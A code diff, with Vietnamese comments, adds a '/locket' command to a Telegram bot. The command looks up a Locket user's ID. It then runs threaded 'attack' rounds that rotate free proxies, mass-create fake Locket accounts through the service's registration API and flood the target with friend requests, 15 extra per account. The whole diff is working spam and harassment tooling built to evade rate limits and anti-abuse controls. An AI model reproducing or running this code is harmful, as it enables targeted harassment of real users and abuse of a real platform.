@@ -327,6 +327,427 @@ def send_message_robustly(chat_id, text=None, photo=None, caption=None, reply_ma
 
 # === LỆNH XỬ LÝ TIN NHẮN ===
 
+# --- THÊM VÀO PHẦN KHAI BÁO BIẾN TOÀN CỤC CỦA BOT ZPROJECT CỦA BẠN ---
+import threading
+import time
+from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
+import logging
+import datetime
+import random
+import string
+import re
+import queue
+import requests
+from requests.exceptions import ProxyError
+
+# Cài đặt cấu hình logging
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
+
+# Biến toàn cục cho quản lý trạng thái của lệnh /locket
+# user_id: { 'step': 'waiting_for_target', 'target': None, 'message_id': None, 'chat_id': None, 'spam_thread': None, 'last_action_time': None, 'current_attack_count': 0 }
+locket_states = {}
+locket_states_lock = threading.Lock()
+
+# Biến toàn cục cho Rate Limiting
+LAST_LOCKET_COMMAND_TIME = {}
+RATE_LIMIT_DURATION = 300 # 5 phút = 300 giây
+
+# Biến toàn cục cho Proxy
+proxy_queue = queue.Queue()
+last_proxy_update_time = 0
+proxy_update_interval = 300 # 5 phút
+
+# Định nghĩa các nguồn proxy miễn phí và uy tín (cập nhật nếu cần)
+FREE_PROXY_SOURCES = [
+    'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all',
+    'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=https&timeout=20000&country=all&ssl=all&anonymity=all',
+    'https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/http.txt',
+    'https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/https.txt',
+    'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt',
+    'https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt',
+    'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
+    'https://raw.githubusercontent.com/sunny9577/proxies/master/proxies.txt'
+]
+
+
+
+# --- THÊM VÀO CODE BOT CỦA BẠN (CÙNG VỚI CÁC @bot.message_handler khác) ---
+
+@bot.message_handler(commands=["locket"])
+# @increment_interaction_count # Nếu bạn có hàm này để đếm tương tác, hãy bỏ comment
+def handle_locket_command(message):
+    user_id = message.from_user.id
+    chat_id = message.chat.id
+
+    # Kiểm tra quyền admin
+    if user_id != ADMIN_ID:
+        return send_message_robustly(chat_id, text="🚫 Bạn không có quyền sử dụng lệnh này.", parse_mode="HTML", reply_to_message_id=message.message_id)
+
+    # Kiểm tra rate limit
+    with locket_states_lock:
+        last_time = LAST_LOCKET_COMMAND_TIME.get(user_id)
+        current_time = time.time()
+        if last_time and (current_time - last_time < RATE_LIMIT_DURATION):
+            remaining_time = int(RATE_LIMIT_DURATION - (current_time - last_time))
+            return send_message_robustly(
+                chat_id,
+                text=f"⏳ Vui lòng chờ <b>{remaining_time} giây</b> nữa trước khi sử dụng lại lệnh /locket.",
+                parse_mode="HTML",
+                reply_to_message_id=message.message_id
+            )
+        LAST_LOCKET_COMMAND_TIME[user_id] = current_time
+
+    # Xóa trạng thái cũ nếu có
+    with locket_states_lock:
+        if user_id in locket_states:
+            del locket_states[user_id]
+
+    # Tin nhắn ban đầu: Đang kiểm tra...
+    checking_msg = send_message_robustly(
+        chat_id,
+        text="⏳ Đang kiểm tra link/username Locket...",
+        parse_mode="HTML",
+        reply_to_message_id=message.message_id
+    )
+
+    if not checking_msg:
+        logging.error(f"Failed to send initial checking message for user {user_id}")
+        return
+
+    # Lưu trạng thái ban đầu
+    with locket_states_lock:
+        locket_states[user_id] = {
+            'step': 'waiting_for_target',
+            'target': None,
+            'message_id': checking_msg.message_id, # Lưu ID tin nhắn để chỉnh sửa
+            'chat_id': chat_id,
+            'spam_thread': None, # Luồng spam sẽ được lưu ở đây
+            'current_attack_count': 0 # Đếm số vòng spam hiện tại
+        }
+
+    # Trích xuất username/link từ tin nhắn
+    command_args = message.text.replace("/locket", "").strip()
+
+    if not command_args:
+        # Yêu cầu người dùng cung cấp username/link
+        bot.edit_message_text(
+            chat_id=chat_id,
+            message_id=checking_msg.message_id,
+            text="⚠️ Vui lòng cung cấp Username hoặc Link Locket. Ví dụ: <code>/locket wusthanhdieu</code> hoặc <code>/locket https://locket.cam/wusthanhdieu</code>",
+            parse_mode="HTML"
+        )
+        return
+
+    # Bắt đầu luồng kiểm tra Locket UID trong nền
+    threading.Thread(target=check_locket_target_thread, args=(user_id, command_args)).start()
+
+
+def check_locket_target_thread(user_id, target_input):
+    with locket_states_lock:
+        state = locket_states.get(user_id)
+        if not state:
+            logging.error(f"State for user {user_id} not found during Locket target check.")
+            return
+
+    chat_id = state['chat_id']
+    message_id = state['message_id']
+
+    # Sử dụng hàm _extract_uid_locket từ zlocket_bot_handler
+    zlocket_bot_handler.messages = [] # Xóa thông báo lỗi cũ
+    locket_uid = zlocket_bot_handler._extract_uid_locket(target_input)
+
+    if locket_uid:
+        with locket_states_lock:
+            state['target'] = locket_uid
+            state['step'] = 'target_checked'
+            locket_states[user_id] = state # Cập nhật lại state
+
+        bot.edit_message_text(
+            chat_id=chat_id,
+            message_id=message_id,
+            text=f"✅ Đã tìm thấy Locket!\n\n"
+                 f"<b>Locket UID:</b> <code>{locket_uid}</code>\n"
+                 f"<b>Username/Link:</b> <code>{html_escape(target_input)}</code>\n\n"
+                 "Bạn có muốn khởi động tấn công (spam kết bạn) Locket này không?",
+            parse_mode="HTML",
+            reply_markup=get_locket_action_markup()
+        )
+        logging.info(f"Locket target {locket_uid} found for user {user_id}")
+    else:
+        error_msg = "\n".join(zlocket_bot_handler.messages)
+        if not error_msg:
+            error_msg = "Không xác định. Vui lòng kiểm tra lại username/link."
+
+        bot.edit_message_text(
+            chat_id=chat_id,
+            message_id=message_id,
+            text=f"❌ Không tìm thấy Locket hoặc Link không hợp lệ.\n\n"
+                 f"<b>Lỗi:</b> {html_escape(error_msg)}\n\n"
+                 "Vui lòng thử lại với lệnh <code>/locket &lt;username/link&gt;</code>.",
+            parse_mode="HTML"
+        )
+        # Xóa trạng thái sau khi lỗi
+        with locket_states_lock:
+            if user_id in locket_states:
+                del locket_states[user_id]
+        logging.warning(f"Locket target not found for user {user_id}: {error_msg}")
+
+
+def get_locket_action_markup():
+    markup = InlineKeyboardMarkup()
+    markup.add(
+        InlineKeyboardButton("🚀 Bật Attack", callback_data="locket_action|start_attack"),
+        InlineKeyboardButton("⛔️ Tắt Attack", callback_data="locket_action|cancel")
+    )
+    return markup
+
+
+@bot.callback_query_handler(func=lambda call: call.data.startswith("locket_action|"))
+def handle_locket_action_callback(call):
+    user_id = call.from_user.id
+    chat_id = call.message.chat.id
+    message_id = call.message.message_id
+    action = call.data.split("|")[1]
+
+    # Đảm bảo chỉ người dùng tạo lệnh mới có thể tương tác
+    with locket_states_lock:
+        state = locket_states.get(user_id)
+        if not state or state['message_id'] != message_id:
+            bot.answer_callback_query(call.id, "Phiên làm việc đã hết hoặc bạn không phải người tạo lệnh này.", show_alert=True)
+            return
+
+    bot.answer_callback_query(call.id) # Gửi phản hồi callback để tắt loading trên nút
+
+    if action == "start_attack":
+        bot.edit_message_text(
+            chat_id=chat_id,
+            message_id=message_id,
+            text="⏳ Đang khởi động tấn công Locket...",
+            parse_mode="HTML"
+        )
+        # Bắt đầu luồng tấn công spam
+        spam_thread = threading.Thread(target=start_locket_attack_thread, args=(user_id,))
+        spam_thread.daemon = True # Đảm bảo luồng sẽ dừng khi bot dừng
+        spam_thread.start()
+
+        with locket_states_lock:
+            state['spam_thread'] = spam_thread
+            state['step'] = 'attacking'
+            locket_states[user_id] = state # Cập nhật lại state
+
+    elif action == "cancel":
+        bot.edit_message_text(
+            chat_id=chat_id,
+            message_id=message_id,
+            text="Đã hủy yêu cầu tấn công Locket.",
+            parse_mode="HTML"
+        )
+        # Xóa trạng thái
+        with locket_states_lock:
+            if user_id in locket_states:
+                del locket_states[user_id]
+
+
+def start_locket_attack_thread(user_id):
+    with locket_states_lock:
+        state = locket_states.get(user_id)
+        if not state or not state.get('target'):
+            logging.error(f"Cannot start Locket attack: invalid state for user {user_id}")
+            return
+
+    chat_id = state['chat_id']
+    message_id = state['message_id']
+    target_uid = state['target']
+
+    zlocket_bot_handler.TARGET_FRIEND_UID = target_uid
+    zlocket_bot_handler.FIREBASE_APP_CHECK = zlocket_bot_handler._load_token_() # Đảm bảo token luôn mới
+
+    if not zlocket_bot_handler.FIREBASE_APP_CHECK:
+        bot.edit_message_text(
+            chat_id=chat_id,
+            message_id=message_id,
+            text="❌ Lỗi: Không thể lấy token Locket. Vui lòng thử lại sau.",
+            parse_mode="HTML"
+        )
+        with locket_states_lock:
+            if user_id in locket_states:
+                del locket_states[user_id]
+        return
+
+    # Lặp lại 2-3 vòng
+    num_rounds = random.randint(2, 3)
+    successful_rounds = 0
+
+    for round_num in range(1, num_rounds + 1):
+        with locket_states_lock:
+            state = locket_states.get(user_id) # Lấy trạng thái mới nhất
+            if not state or state.get('step') != 'attacking':
+                logging.info(f"Attack stopped prematurely for user {user_id}.")
+                break # Dừng vòng lặp nếu trạng thái thay đổi
+
+        bot.edit_message_text(
+            chat_id=chat_id,
+            message_id=message_id,
+            text=f"🚀 Đang tấn công Locket <b><code>{html_escape(target_uid)}</code></b>...\n"
+                 f"Vòng: <b>{round_num}/{num_rounds}</b>\n"
+                 f"Tài khoản đã tạo: <b>{zlocket_bot_handler.successful_requests}</b>\n"
+                 f"Yêu cầu thất bại: <b>{zlocket_bot_handler.failed_requests}</b>",
+            parse_mode="HTML"
+        )
+
+        # Lấy một số lượng proxy nhất định cho mỗi vòng tấn công
+        # Để đảm bảo phân phối đều và không làm cạn kiệt nhanh chóng
+        num_proxies_per_round = 10 # Số lượng proxy được lấy từ queue cho mỗi vòng
+        current_round_proxies = []
+        for _ in range(num_proxies_per_round):
+            proxy = get_next_proxy()
+            if proxy:
+                current_round_proxies.append(proxy)
+            else:
+                logging.warning(f"Not enough proxies for round {round_num}. Using {len(current_round_proxies)} available proxies.")
+                break # Không có đủ proxy, dùng số lượng hiện có
+
+        if not current_round_proxies:
+            bot.edit_message_text(
+                chat_id=chat_id,
+                message_id=message_id,
+                text=f"❌ Lỗi: Không có proxy khả dụng cho vòng tấn công {round_num}. Dừng tấn công.",
+                parse_mode="HTML"
+            )
+            break
+
+        threads = []
+        stop_event_attack = threading.Event() # Event để dừng các luồng con nếu cần
+        
+        # Reset lại số liệu thống kê cho mỗi vòng để dễ theo dõi hơn
+        zlocket_bot_handler.successful_requests = 0
+        zlocket_bot_handler.failed_requests = 0
+
+        for i in range(len(current_round_proxies)): # Chỉ cần số lượng luồng bằng số proxy hiện có
+            thread = threading.Thread(
+                target=run_locket_spam_worker,
+                args=(user_id, i, stop_event_attack)
+            )
+            threads.append(thread)
+            thread.start()
+
+        # Chờ các luồng hoàn thành trong vòng này
+        for t in threads:
+            t.join() # Chờ từng luồng hoàn thành
+
+        if zlocket_bot_handler.successful_requests > 0:
+            successful_rounds += 1
+        
+        time.sleep(5) # Nghỉ giữa các vòng
+
+    final_message = f"✅ Đã hoàn tất tấn công Locket <b><code>{html_escape(target_uid)}</code></b>!\n\n"
+    if successful_rounds > 0:
+        final_message += f"<b>Tổng số vòng thành công:</b> {successful_rounds}/{num_rounds}\n"
+        final_message += f"<b>Tổng tài khoản tạo thành công:</b> {zlocket_bot_handler.successful_requests}\n"
+        final_message += f"<b>Tổng yêu cầu thất bại:</b> {zlocket_bot_handler.failed_requests}\n\n"
+        final_message += "Đã kết thúc quá trình attack."
+    else:
+        final_message = f"❌ Không thể tấn công Locket <b><code>{html_escape(target_uid)}</code></b>.\n"
+        final_message += "Có thể do không có proxy khả dụng hoặc lỗi kết nối. Vui lòng thử lại sau."
+
+
+    bot.edit_message_text(
+        chat_id=chat_id,
+        message_id=message_id,
+        text=final_message,
+        parse_mode="HTML"
+    )
+
+    # Xóa trạng thái sau khi hoàn thành
+    with locket_states_lock:
+        if user_id in locket_states:
+            del locket_states[user_id]
+
+
+def run_locket_spam_worker(user_id, thread_id, stop_event):
+    """
+    Hàm worker cho mỗi luồng spam Locket.
+    Mỗi luồng sẽ cố gắng tạo một số lượng tài khoản/yêu cầu kết bạn nhất định.
+    """
+    with locket_states_lock:
+        state = locket_states.get(user_id)
+    
+    if not state:
+        logging.error(f"Worker {thread_id} failed: No state for user {user_id}")
+        return
+
+    # Mỗi luồng sẽ cố gắng tạo ACC_PER_THREAD tài khoản
+    accounts_per_thread_target = random.randint(6, 10) # Có thể lấy từ config.ACCOUNTS_PER_PROXY
+    
+    successful_accounts_in_thread = 0
+    failed_attempts_in_thread = 0
+    max_failed_attempts_per_thread = 5 # Số lần thử lại tối đa cho 1 luồng nếu gặp lỗi liên tiếp
+
+    while not stop_event.is_set() and \
+          successful_accounts_in_thread < accounts_per_thread_target and \
+          failed_attempts_in_thread < max_failed_attempts_per_thread:
+        
+        if stop_event.is_set():
+            return
+
+        prefix = f"[{thread_id:03d} | Register]"
+        email = _rand_email_()
+        password = _rand_pw_()
+        
+        payload = {
+            "data": {
+                "email": email,
+                "password": password,
+                "client_email_verif": True,
+                "client_token": _rand_str_(40, chars=string.hexdigits.lower()),
+                "platform": "ios"
+            }
+        }
+        
+        response_data = zlocket_bot_handler.excute(
+            f"{zlocket_bot_handler.API_LOCKET_URL}/createAccountWithEmailPassword",
+            headers=zlocket_bot_handler.headers_locket(),
+            payload=payload,
+            thread_id=thread_id,
+            step="Register"
+        )
+
+        if stop_event.is_set():
+            return
+
+        if response_data == "no_proxy" or response_data == "proxy_dead" or response_data == "too_many_requests" or response_data is None:
+            failed_attempts_in_thread += 1
+            logging.warning(f"[{thread_id}] Proxy/Network issue or too many requests. Retrying. Attempts: {failed_attempts_in_thread}/{max_failed_attempts_per_thread}")
+            time.sleep(1) # Chờ một chút trước khi thử lại
+            continue
+        
+        if isinstance(response_data, dict) and response_data.get('result', {}).get('status') == 200:
+            successful_accounts_in_thread += 1
+            failed_attempts_in_thread = 0 # Reset lỗi khi thành công
+
+            id_token, local_id = step1b_sign_in(email, password, thread_id, None)
+            if id_token and local_id:
+                if step2_finalize_user(id_token, thread_id, None):
+                    # Gửi yêu cầu kết bạn ban đầu
+                    if step3_send_friend_request(id_token, thread_id, None):
+                        # Boost thêm 15 yêu cầu
+                        for _ in range(15):
+                            if stop_event.is_set():
+                                return
+                            step3_send_friend_request(id_token, thread_id, None)
+                    else:
+                        logging.warning(f"[{thread_id}] Initial friend request failed for new account.")
+                else:
+                    logging.warning(f"[{thread_id}] Profile finalization failed for new account.")
+            else:
+                logging.warning(f"[{thread_id}] Authentication (step 1b) failed for new account.")
+        else:
+            failed_attempts_in_thread += 1
+            logging.warning(f"[{thread_id}] Identity creation failed. Attempts: {failed_attempts_in_thread}/{max_failed_attempts_per_thread}. Response: {response_data}")
+            # Có thể thêm logic kiểm tra lỗi cụ thể từ response_data để đưa ra hành động phù hợp hơn
+
+    logging.info(f"Worker {thread_id} finished. Created {successful_accounts_in_thread} accounts.")
+
 @bot.message_handler(commands=["start"])
 @increment_interaction_count
 def start_cmd(message):
